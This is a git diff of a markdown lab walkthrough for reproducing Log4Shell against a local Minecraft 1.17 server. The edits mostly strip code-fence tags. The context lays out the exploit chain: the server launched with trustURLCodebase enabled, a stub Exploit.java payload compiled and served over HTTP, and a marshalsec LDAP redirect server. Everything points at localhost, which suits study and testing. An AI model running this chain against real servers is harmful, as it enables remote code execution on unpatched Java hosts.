@@ -54,14 +54,14 @@ mkdir -p ~/log4j-lab/{server,payload}
 
 Download Minecraft 1.17 server jar from https://xyrios.com/minecraft/tools/mc-versions/1.17 and put it into ~/log4j-lab/server/. Do the same with the client jar and put it into ~/log4j-lab/client
 
-```bash
+```
 cd ~/log4j-lab/server
 
 ```
 
 Accept the EULA and do the initial setup:
 
-```bash
+```
 # first run generates eula.txt
 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Xmx1024M -Xms1024M -jar server.jar nogui
 
@@ -73,7 +73,7 @@ Run the command again if needed.
 
 Start the server with `trustURLCodebase` enabled (not sure if necessary - will test in future:
 
-```bash
+```
 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Xmx1024M -Xms1024M \
   -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
   -Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
@@ -88,13 +88,14 @@ Leave this terminal open.
 
 Install Prism Launcher via AppImage to avoid flatpak/FUSE issues on the VM:
 
-```bash
+```
 sudo wget https://prism-launcher-for-debian.github.io/repo/prismlauncher.gpg -O /usr/share/keyrings/prismlauncher-archive-keyring.gpg \
   && echo "deb [signed-by=/usr/share/keyrings/prismlauncher-archive-keyring.gpg] https://prism-launcher-for-debian.github.io/repo $(. /etc/os-release; echo "${UBUNTU_CODENAME:-${DEBIAN_CODENAME:-${VERSION_CODENAME}}}") main" | sudo tee /etc/apt/sources.list.d/prismlauncher.list \
   && sudo apt update \
   && sudo apt install prismlauncher
 ```
-After downloading, run ```bash
+After downloading, run 
+```
 prismlauncher
 ```
 Click "New Instance", then click Edit on the right side of the setting menu for the instance. Click "Add to Minecraft.jar" on the right side, select Browse, and select your client.jar file from the folder. Then click on that newly created jar in the list, and click Launch in the bottom right. You will have had to login to your Minecraft account on the launcher to play the client. Select Multiplayer -> Direct Connection -> 127.0.0.1:25565 to connect to your world. 
@@ -103,7 +104,7 @@ In Prism Launcher:
 
 1. Click **Add Instance**
 2. Select Minecraft version **1.17**
-# Port number can be found in server folder under server.properties
+Port number can be found in server folder under server.properties. Default is 25565
 3. Launch the instance and connect to `localhost:port` or `127.0.0.1:port`
 
 
@@ -113,14 +114,14 @@ In Prism Launcher:
 
 Open a new terminal:
 
-```bash
+```
 cd ~/log4j-lab/payload
 nano Exploit.java
 ```
 
 Paste the following:
 
-```java
+```
 public class Exploit {
     static {
         try {
@@ -132,7 +133,7 @@ public class Exploit {
 
 Compile it targeting Java 17 bytecode:
 
-```bash
+```
 /usr/lib/jvm/java-17-openjdk-amd64/bin/javac Exploit.java```
 
 Confirm both files exist:
@@ -144,7 +145,7 @@ ls
 
 Start the HTTP server to serve the payload — keep this terminal open:
 
-```bash
+```
 python3 -m http.server 8888
 ```
 
@@ -154,7 +155,7 @@ python3 -m http.server 8888
 
 Open a new terminal:
 
-```bash
+```
 cd ~/log4j-lab
 git clone https://github.com/mbechler/marshalsec
 cd marshalsec
@@ -163,7 +164,7 @@ mvn clean package -DskipTests
 
 Once the build finishes, start the LDAP redirect server per the marshalsec README:
 
-```bash
+```
 cd ~/log4j-lab/marshalsec
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
   "http://127.0.0.1:8888/#Exploit"
